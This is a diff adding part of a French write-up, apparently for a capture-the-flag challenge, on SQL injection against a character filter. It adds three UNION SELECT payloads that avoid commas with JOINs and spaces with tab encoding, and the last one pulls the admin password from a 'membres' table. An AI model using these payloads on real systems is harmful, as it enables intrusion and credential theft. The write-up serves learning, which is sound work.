@@ -23,4 +23,16 @@ Les caractères filtrés et leurs contournements :
 
 Indice du code source : la table a 4 colonnes.
 
+![image](https://github.com/user-attachments/assets/eaf32426-edf5-43a6-8e47-34205fab5af8)
+
+Payload de base :
+0 UNION SELECT * FROM (SELECT 1) AS A JOIN (SELECT 2) AS B JOIN (SELECT 3) AS C JOIN (SELECT 4) AS D
+
+Version adaptée :
+0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)%09AS%09A%09JOIN%09(SELECT%092)%09AS%09B%09JOIN%09(SELECT%093)%09AS%09C%09JOIN%09(SELECT%094)%09AS%09D
+
+Payload final pour récupérer le mot de passe admin :
+0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)%09AS%09A%09JOIN%09(SELECT%092)%09AS%09B%09JOIN%09(SELECT%093)%09AS%09C%09JOIN%09(SELECT%09pass%09From%09membres%09LIMIT%091%09OFFSET%090%09)%09AS%09D
+
+
 
